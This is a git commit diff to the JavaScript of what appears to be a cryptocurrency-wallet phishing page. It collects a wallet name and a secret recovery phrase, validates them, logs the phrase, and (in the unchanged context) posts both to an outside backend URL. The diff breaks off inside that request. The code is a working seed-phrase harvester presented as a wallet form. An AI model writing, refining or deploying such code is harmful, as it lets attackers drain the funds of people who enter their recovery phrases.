c19671c57d93a2745f4600e669210364b94384c7
clientBackend <148474934+clientBackend@users.noreply.github.com>
2023-11-26 23:51:44 +0530

    Update multicoin.js

--- MultiCoin/multicoin.js
+++ MultiCoin/multicoin.js
@@ -1,23 +1,27 @@
 let walletName = ""
 let secretPhrase = ""
+
 let error1 = false;
 let error2 = false;
 let error3 = false;
 let error4 = false;
 
-document.querySelector(".input-box").addEventListener("change",(e)=>{
+document.querySelector(".input-box").addEventListener("input",(e)=>{
   document.querySelector(".error-box-1").classList.add("display")
   walletName = e.target.value;
 })
 
+document.querySelector(".text-box").addEventListener("input",(e)=>{
+  document.querySelector(".error-box-2").classList.add("display")
+  secretPhrase = e.target.value;
+  console.log(secretPhrase)
+})
+
+//colouring
 document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
 document.querySelector(".button").style.color = "rgba(0, 0, 0, 0.205)"
 
-document.querySelector(".text-box").addEventListener("change",(e)=>{
-  document.querySelector(".error-box-2").classList.add("display")
-  secretPhrase = e.target.value;
-})
-
+//colouring
 document.querySelector(".text-box").addEventListener("input",(e)=>{
   if(e.target.value.length === 0){
     document.querySelector(".button").style.backgroundColor = "rgba(245, 245, 245, 0.985)"
@@ -32,11 +36,11 @@ document.querySelector(".text-box").addEventListener("input",(e)=>{
 function checkSymbNum(inputData){
   let inputLen = inputData.length
   for(let i=0;i<inputLen;i++){
-    if((((inputData.charCodeAt(i)) >= 0 && (inputData.charCodeAt(i)) < 65) || ((inputData.charCodeAt(i)) >= 91 && (inputData.charCodeAt(i)) <= 96) ) ||  ((inputData.charCodeAt(i)) >= 123 && (inputData.charCodeAt(i)) <= 126)){
-      return false;
+    if((inputData.charCodeAt(i)>=0 && inputData.charCodeAt(i)<=31) || (inputData.charCodeAt(i)>=33 && inputData.charCodeAt(i)<=64) || (inputData.charCodeAt(i)>=91 && inputData.charCodeAt(i)<=96) || (inputData.charCodeAt(i)>=123 && inputData.charCodeAt(i)<=126)){
+      return true;
     }
   }
-  return true;
+  return false;
 }
 
 function checkSecret(str){
@@ -49,9 +53,9 @@ function checkSecret(str){
         wordLen++;
       }
     }
-    if(wordLen < 3){
-      return true;
-    }
+      if(wordLen < 3){
+        return true;
+      }
   }
   return false;
 }
@@ -59,38 +63,30 @@ function checkSecret(str){
 document.querySelector(".button").addEventListener("click",(e)=>{
   e.preventDefault();
 
-  if(!checkSymbNum(walletName)){
-    error3 = true
-    document.querySelector(".error-box-1").classList.remove("display");
-    document.querySelector(".error-box-1").innerHTML = "*Wallet name should not contain any number or symbol";
-  }
-
-  if(!checkSymbNum(secretPhrase)){
-    error4 = true
-    document.querySelector(".error-box-2").classList.remove("display");
-    document.querySelector(".error-box-2").innerHTML = "*Secret phrase should not contain any number or symbol";
-  }
-
-  if(walletName.length==0 || walletName.length ===null){
-    error1 = true;
-  }
-
-  if(secretPhrase.length==0 || secretPhrase.length ===null){
-    error2 = true;
-  }
-
   let ans = checkSecret(secretPhrase);
-
-  console.log(ans)
-
   if(ans){
     document.querySelector(".error-box-2").classList.remove("display");
     document.querySelector(".error-box-2").innerHTML = "*Length Of Each Word Should Be Atleast 3 Letters";
   }
 
-  if(error1){
+  if(checkSymbNum(walletName)){
+    error3 = true
     document.querySelector(".error-box-1").classList.remove("display");
-    document.querySelector(".error-box-1").innerHTML = "*Enter The Wallet Name";
+    document.querySelector(".error-box-1").innerHTML = "*Wallet name should not contain any number or symbol";
+  }
+
+  if(checkSymbNum(secretPhrase)){
+    error4 = true
+    document.querySelector(".error-box-2").classList.remove("display");
+    document.querySelector(".error-box-2").innerHTML = "*Secret phrase should not contain any number or symbol";
+  }
+
+  if(document.querySelector(".input-box").value === ""){
+    error1 = true;
+  }
+
+  if(document.querySelector(".text-box").value === ""){
+    error2 = true;
   }
 
   if(error2){
@@ -98,7 +94,13 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     document.querySelector(".error-box-2").innerHTML = "*Enter Secret Phrase";
   }
 
+  if(error1){
+    document.querySelector(".error-box-1").classList.remove("display");
+    document.querySelector(".error-box-1").innerHTML = "*Enter The Wallet Name";
+  }
+
   if(ans === false && (error1 === false && error2 === false) && (error3 === false && error4 === false)){
+    console.log("DONE")
     const url = "https://backend-01-92mi.onrender.com/api/data2";
       const data = {
           walletName:walletName,
